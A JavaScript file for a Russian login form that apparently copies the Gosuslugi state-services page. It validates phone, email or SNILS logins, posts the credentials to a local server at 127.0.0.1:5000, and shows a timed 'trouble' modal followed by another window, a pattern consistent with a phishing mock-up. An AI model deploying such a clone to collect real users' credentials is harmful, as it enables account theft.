function labelsm(id) {
	let obj = document.getElementById(id);
	obj.classList.remove("labels-notclicked");
	obj.classList.add("labels-clicked");
}
let lasttext = false;
function labelbig(id, parent_id) {
	let parent_obj = document.getElementById(parent_id);
	let obj = document.getElementById(id);
	document.getElementById('login-alert').innerHTML = "Введите логин";
	document.getElementById('password-alert').innerHTML = "Введите пароль";
	if (parent_obj.value == ""){
		obj.classList.add("labels-notclicked");
		obj.classList.remove("labels-clicked");
		if (lasttext){
			parent_obj.style.backgroundColor = '#fce0e4';
			if (id === 'loginlabel') document.getElementById('login-alert').hidden = false;
			else if (id === 'passwordlabel') document.getElementById('password-alert').hidden = false;
		}
	}
	else{
		lasttext = true;
		parent_obj.style.backgroundColor = '#f5f7fa';
		if (id === 'loginlabel') document.getElementById('login-alert').hidden = true;
		else if (id === 'passwordlabel') document.getElementById('password-alert').hidden = true;
	}
}
function password_on_input(){
	let parent_obj = document.getElementById("password");
	if (parent_obj.value == "")
		document.getElementById("toggle").hidden = true;
	else
		document.getElementById("toggle").hidden = false;
}
function modal_show(id){
	let obj = document.getElementById(id)
	obj.hidden = false;
	let main_body = document.body;
	main_body.classList.add('modal-open');
	if (id == "modal_window_trouble"){
		setTimeout(trouble_closer, 5 * 1000);
	}
}
function try_to_send(e){
	let password_box = document.getElementById("password");
	let login_box = document.getElementById("login");
	if((e.target == password_box || e.target == login_box) && e.key == "Enter"){
		if (e.target == login_box && password_box.value == ""){
			login_box.blur();
			password_box.focus();
		}
		else if (e.target == password_box && login_box.value == ""){
			password_box.blur();
			login_box.focus();
		}
		else{
			login_box.blur();
			password_box.blur();
			form_sender();
		}
	}
}
let showed = true;
document.addEventListener('mousedown', e => {
	let container1 = document.getElementById('modal_window');
	let container2 = document.getElementById('modal_window_after');
	let toggle = document.getElementById("toggle");
	if ((e.target == container1)||(e.target == container2)){
		e.target.hidden = true;
		let main_body = document.body;
		main_body.classList.remove('modal-open');
	}
	if (showed && e.target == toggle){
		toggle_show_hide("show");
	}
	else if (!showed && e.target == toggle){
		toggle_show_hide("hide");
	}
});
function toggle_show_hide(status){
	let text_password = document.getElementById("password");
	let toggle = document.getElementById("toggle");
	if (status == "show"){
		text_password.type = "text";
		toggle.classList.remove("hidden");
		toggle.classList.add("showed");
		showed = false;
	}
	else if (status == "hide"){
		text_password.type = "password";
		toggle.classList.remove("showed");
		toggle.classList.add("hidden");
		showed = true;
	}
}
function close_click(window){
	let main_body = document.body;
	if (window == 1){
		document.getElementById("modal_window").hidden = true;
		main_body.classList.remove('modal-open');
	}
	else if (window == 2){
		document.getElementById("modal_window_after").hidden = true;
		main_body.classList.remove('modal-open');
	}
}
function QR_referal(id) {
	if (id === "QR"){
		window.location.href = "QR_verify.html"
	}
	else if (id === "electronic signature")
		window.location.href = "ES_verify.html"
}
function trouble_closer() {
	document.getElementById("modal_window_trouble").hidden = true;
	document.getElementById("modal_window_after").hidden = false;
}
function isValidPhone(phone){
	if (/^(\s*)?(\+)?([- _():=+]?\d[- _():=+]?){10,14}(\s*)?$/.test(phone)) return true;
	return false;
}
function isValidEmail(email){
	console.log(email);
	if(/^(([^<>()[\].,;:\s@"]+(\.[^<>()[\].,;:\s@"]+)*)|(".+"))@(([^<>()[\].,;:\s@"]+\.)+[^<>()[\].,;:\s@"]{2,})$/iu.test(email)) { console.log(true); return true;}
	return false;
}
function isValidSnils(snils){
  snils = String(snils).replace(/[^0-9]+/g, '');
  if( snils.length == 11 ) {
    var checksum = 0;
    for( var i = 0; i < 9; i++ ) {
      checksum += parseInt(snils.charAt(i)) * (9 - i);
    }
    if( checksum > 101 ) {
      checksum = checksum % 101;
    }
    if( checksum == 100 || checksum == 101 ) {
      checksum = 0;
    }
    return checksum == parseInt(snils.substr(9));
  }
  return false;
}
document.addEventListener('submit', e => {
	e.preventDefault();
	let form = document.getElementById("gos_form");
	let password = document.getElementById('password').value;
	let login = document.getElementById('login').value;
	if ((isValidPhone(login) || isValidEmail(login)|| isValidSnils(login)) && password.length >= 8){
		document.getElementById('password-alert').innerHTML = "Введите пароль";
		document.getElementById('login').style.backgroundColor = '#fff';
		document.getElementById('password').style.backgroundColor = '#fff';
		document.getElementById('password-alert').hidden = true;
		form.action="http://127.0.0.1:5000/submit";
		form.method="post";
		form.submit();
	}
	else if (login != "" && password != ""){
		document.getElementById('password-alert').innerHTML = "Неверные логин или пароль";
		document.getElementById('login').style.backgroundColor = '#fce0e4';
		document.getElementById('password').style.backgroundColor = '#fce0e4';
		document.getElementById('password-alert').hidden = false;
	}
});